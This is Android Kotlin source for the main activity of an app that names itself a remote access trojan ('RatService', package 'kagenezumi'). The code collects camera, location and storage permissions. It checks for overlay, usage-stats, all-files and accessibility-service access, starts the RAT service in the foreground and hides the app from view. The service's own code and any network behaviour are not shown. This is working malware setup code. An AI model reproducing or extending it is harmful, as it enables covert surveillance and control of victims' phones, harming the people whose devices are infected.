package com.example.kagenezumi

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Process
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import android.util.Log

class MainActivity : ComponentActivity() {
    private lateinit var statusText: TextView
    private lateinit var requestPermissionsButton: Button

    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    )

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.all { it.value }
        if (allGranted) {
            startRatService()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.statusText)
        requestPermissionsButton = findViewById(R.id.requestPermissionsButton)

        requestPermissionsButton.setOnClickListener {
            checkAndRequestPermissions()
        }

        checkAndUpdateStatus()
    }

    private fun checkAndUpdateStatus() {
        val status = StringBuilder()
        var allGranted = true

        // Check regular permissions
        for (permission in requiredPermissions) {
            val isGranted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            status.append("${permission.split(".").last()}: ${if (isGranted) "✓" else "✗"}\n")
            if (!isGranted) allGranted = false
        }

        // Check special permissions
        val specialPermissionsStatus = checkSpecialPermissions()
        status.append("\nSpecial Permissions:\n")
        specialPermissionsStatus.forEach { (name, granted) ->
            status.append("$name: ${if (granted) "✓" else "✗"}\n")
            if (!granted) allGranted = false
        }

        // Check Accessibility Service
        val accessibilityEnabled = isAccessibilityServiceEnabled()
        status.append("\nAccessibility Service: ${if (accessibilityEnabled) "✓" else "✗"}\n")
        if (!accessibilityEnabled) allGranted = false

        statusText.text = status.toString()
        
        if (allGranted) {
            startRatService()
        }
    }

    private fun checkSpecialPermissions(): Map<String, Boolean> {
        return mapOf(
            "SYSTEM_ALERT_WINDOW" to Settings.canDrawOverlays(this),
            "PACKAGE_USAGE_STATS" to checkUsageStatsPermission(),
            "MANAGE_EXTERNAL_STORAGE" to Environment.isExternalStorageManager()
        )
    }

    private fun checkUsageStatsPermission(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            Process.myUid(),
            packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
        return enabledServices.any { it.id.contains(packageName) }
    }

    private fun checkAndRequestPermissions() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isEmpty()) {
            startRatService()
        } else {
            permissionLauncher.launch(permissionsToRequest)
        }
    }

    private fun startRatService() {
        // Check if we need to request overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivity(intent)
        }

        // Start the service
        val serviceIntent = Intent(this, RatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // Minimize the app
        moveTaskToBack(true)
    }
}
